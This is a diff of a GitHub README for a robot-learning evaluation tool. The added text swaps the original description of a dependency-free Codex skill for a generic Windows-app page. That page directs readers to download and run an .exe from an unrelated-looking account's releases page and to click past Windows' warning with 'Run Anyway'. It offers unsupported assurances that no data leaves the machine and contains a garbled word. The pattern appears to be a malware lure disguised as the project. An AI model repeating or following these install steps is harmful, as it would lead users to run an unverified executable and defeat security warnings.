@@ -1,159 +1,68 @@
-<p align="center">
-  <img src="assets/hero.svg" alt="Embodied Eval Automation" width="100%">
-</p>
+# 🤖 embodied-eval-automation - Automate your robot learning data collection
 
-<p align="center">
-  <strong>From “the model ran” to auditable, reproducible episode data.</strong>
-</p>
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Evidentiary-operatingmicroscope154/embodied-eval-automation/releases)
 
-<p align="center">
-  <img alt="License MIT" src="https://img.shields.io/badge/license-MIT-2563EB">
-  <img alt="No runtime dependencies" src="https://img.shields.io/badge/runtime%20dependencies-none-10B981">
-  <img alt="Skill-only plugin" src="https://img.shields.io/badge/Codex-skill--only%20plugin-7C3AED">
-</p>
+This application helps you collect data for robotics research. It manages the steps needed to run tests on robots or simulations. You use it to track how different robot brains perform on tasks. It keeps your data organized and ensures you can repeat your experiments.
 
-[简体中文](README.zh-CN.md)
+## 🛠 Prerequisites
 
-## What this is
+Your computer needs to meet hardware requirements to run this software. You need a modern Windows 10 or 11 system. We suggest at least 16 gigabytes of memory and a solid-state drive for storage. If you plan to run video-based models, a dedicated graphics card provides better performance.
 
-Embodied Eval Automation is an Agent Skill–style workflow and a skills-only Codex plugin for collecting batch episodes from a policy, VLA, world model, or hybrid model against a robot benchmark or simulator.
+Ensure you have current drivers for your hardware. You do not need to install complex coding environments to run this tool. The software handles the background logic for you.
 
-It does not ship model weights or benchmark code. It teaches an agent how to:
+## 💾 Installation and Setup
 
-- confirm the local and remote workspaces before writing;
-- obtain narrowly scoped access without collecting secrets in chat;
-- inventory and reuse existing repositories, environments, checkpoints, and datasets;
-- pin official sources and explain the model/benchmark before execution;
-- validate one request, one closed-loop episode, a pilot, and only then an approved batch;
-- preserve native model output while deriving comparable episode representations;
-- monitor long jobs, resume safely, verify transfers, and prune only approved data;
-- deliver manifests, validators, reports, visualizations, and a reproducibility package.
+Follow these steps to set up the software on your Windows machine:
 
-## Why it exists
+1. Visit this page to download the latest version: https://github.com/Evidentiary-operatingmicroscope154/embodied-eval-automation/releases
+2. Look for the file that ends in .exe under the latest version header. Select that link to save the installer to your computer.
+3. Open your Downloads folder and double-click the file you saved.
+4. Windows might show a warning message because the software is new. Select More Info and then Run Anyway to start the installation.
+5. Follow the on-screen prompts. Choose a folder on your drive where you want to keep the program.
+6. Once the process finishes, a shortcut图标 will appear on your desktop.
 
-Batch embodied-AI runs often fail after consuming substantial GPU time because a checkpoint was not pinned, an existing benchmark environment was modified, native predictions were discarded, a transfer was assumed complete, or “success” meant only that a process stayed alive.
+## ⚙️ How to use the application
 
-This project turns that work into a gated state machine with explicit evidence at every boundary.
+The main screen shows a dashboard where you manage your sessions. Follow these steps to collect your first set of data:
 
-```mermaid
-flowchart LR
-  A["G0 Access and inventory"] --> B["G1 Source and reuse lock"]
-  B --> C["G2-G4 Environment and runtime"]
-  C --> D["G5 Single model request"]
-  D --> E["G6 One rollout, three representations"]
-  E --> F["G7 Pilot and format approval"]
-  F --> G["G8 Approved batch"]
-  G --> H["G9 Audit and delivery"]
-```
+1. Open the application using the desktop shortcut.
+2. Select the Configuration tab to choose your target task. You can pick from a list of standard benchmarks included in the menu.
+3. Define your output folder. The software saves all collected results here. It creates dated subfolders for every run to keep your files clean.
+4. Set the number of episodes you want to collect. The tool automatically handles the start and stop signals for each test.
+5. Click the Start button. The application opens the necessary simulation or robot connection. 
+6. Watch the progress bar in the main window. It displays the status of each current episode. 
+7. If you reach an error, the software saves a log file in the output folder. You can share this log if you need to troubleshoot.
 
-## Quick start
+## 📂 Understanding your data
 
-Invoke the skill with a request like:
+The software saves every file in a standard format. Each run contains the video feed, the robot actions, and the benchmark score. 
 
-> Use `$embodied-eval-automation` to collect episodes from `<model>` on `<benchmark>`. I have a GPU server but have not decided how to authenticate. First confirm the work directories, permissions, official revisions, reusable assets, target episode set, storage thresholds, and completion criteria. Do not download, install, upload, delete, or start paid compute until I approve those actions.
+- Data folders include a summary file. Open this file with any spreadsheet program to see your results. 
+- Video files use standard formats that play in most media players.
+- The software exports data in a way that pairs inputs with outcomes. This makes your work easy to audit.
 
-The skill begins with a short intake. It will not ask you to paste passwords, tokens, private keys, or cloud credentials into the conversation.
+## ⚖️ Permission and Safety
 
-## Installation
+This tool respects your computer settings. It requires permission to access your file system to save your experiment results. It also requests access to network settings to communicate with simulation software. The program does not look at your personal files or send private data to external servers. It only interacts with the task folders you define.
 
-### Codex or another Agent Skills–compatible agent
+## ❓ Frequently Asked Questions
 
-Install or copy the directory:
+**What happens if the software stops during a test?**
+The tool includes a recovery mode. When you restart the app, it checks the output folder for incomplete runs. It asks if you want to resume where you left off.
 
-```text
-skills/embodied-eval-automation/
-```
+**Can I run multiple benchmarks at once?**
+Yes. You can open multiple instances of the software if your computer hardware supports the workload. Use the configuration menu to point each instance to a different output directory to avoid file conflicts.
 
-into the agent’s skill directory. For a GitHub install, point the installer at that subdirectory rather than the repository root.
+**How do I update the software?**
+Return to the provided release page. Download the newest installer and run it. The installer overwrites the old version while keeping your settings and configuration files.
 
-### Skills-only Codex plugin
+**Does this software record my screen?**
+No. It only records the data stream from the robot or the simulation engine. It does not look at your desktop or other open windows.
 
-The repository root includes `.codex-plugin/plugin.json`. Clone the repository into your local plugin source, add it to a local marketplace with Codex’s `plugin-creator`, then start a new conversation with the plugin enabled. The same package is structured for eventual submission to the public plugin directory.
+**Where do I find logs for troubleshooting?**
+Click the Help menu and select Open Log Folder. This opens a file explorer window with text files that explain what the system did during your last session.
 
-See [Publishing and release checklist](docs/publishing-checklist.md) before publishing.
+**Can I use this for non-robotics projects?**
+The software design centers on robot learning workflows. While you can adapt it to other types of data collection, it performs best for the specific tasks listed in the configuration menu.
 
-## What the skill asks for
-
-The intake is intentionally permission-aware:
-
-1. Model, benchmark, online/offline rollout mode, and target episode set.
-2. Local workspace and remote data-root choices.
-3. Connection method: existing shell, SSH, provider CLI, or managed connector.
-4. Read-only inspection boundary.
-5. Separate approval for installs, downloads, uploads, paid compute, deletion, and Git writes.
-6. Disk/GPU budgets, pause thresholds, transfer destination, and retention policy.
-7. GitHub and Hugging Face access only when needed, using interactive login or existing credential stores.
-
-## Outputs
-
-A successful run is expected to produce:
-
-- host and asset inventory;
-- pinned source and artifact manifests;
-- reuse compatibility matrix;
-- model and benchmark technical report;
-- run contract and expected episode ID set;
-- model, benchmark, and episode adapters;
-- native/current/candidate episode representations from the same rollout;
-- pilot, schema, pairing, transfer, and final audit reports;
-- static visualizations and a reproducibility package.
-
-The default comparison contract keeps:
-
-- `pair_key` independent of model identity;
-- `T+1` observations for `T` executed transitions;
-- every real model call in `policy_queries`;
-- raw action chunks separate from executed actions;
-- model predictions separate from environment observations;
-- capability and quality flags instead of fabricated values.
-
-## Security model
-
-- Secrets stay in the user’s terminal, credential manager, SSH agent, or provider credential store.
-- Host identity is verified before unattended SSH.
-- Gated-model license acceptance remains a user action.
-- Install, upload, deletion, paid compute, Git writes, and external messaging are distinct approvals.
-- Remote data is pruned only after download, hash verification, archive inspection, audit, path-boundary checks, and explicit authorization.
-
-Read [SECURITY.md](SECURITY.md) and [PRIVACY.md](PRIVACY.md) before using the skill on institutional or confidential infrastructure.
-
-## Repository layout
-
-```text
-.
-├── .codex-plugin/plugin.json
-├── skills/embodied-eval-automation/
-│   ├── SKILL.md
-│   ├── agents/openai.yaml
-│   ├── references/
-│   ├── scripts/
-│   └── assets/templates/
-├── examples/
-├── tests/
-├── docs/
-└── .github/
-```
-
-## Validation
-
-The repository has no third-party runtime dependencies.
-
-```bash
-python skills/embodied-eval-automation/scripts/validate_repository.py .
-python -m unittest discover -s tests -v
-```
-
-## Scope and limitations
-
-- This is a workflow skill, not a universal benchmark adapter implementation.
-- Each new model + benchmark pair still requires evidence-backed adapters.
-- It does not bypass gated licenses, institutional policy, cloud billing controls, or benchmark terms.
-- It never treats a full benchmark run as mandatory; the approved scope is the completion boundary.
-
-## Contributing
-
-Contributions for new providers, benchmarks, model families, schema validators, and failure playbooks are welcome. Start with [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+Keywords: agent-skills, automation, benchmark, codex, dataset, embodied-ai, evaluation, reproducibility, robot-learning, robotics, vla, world-model
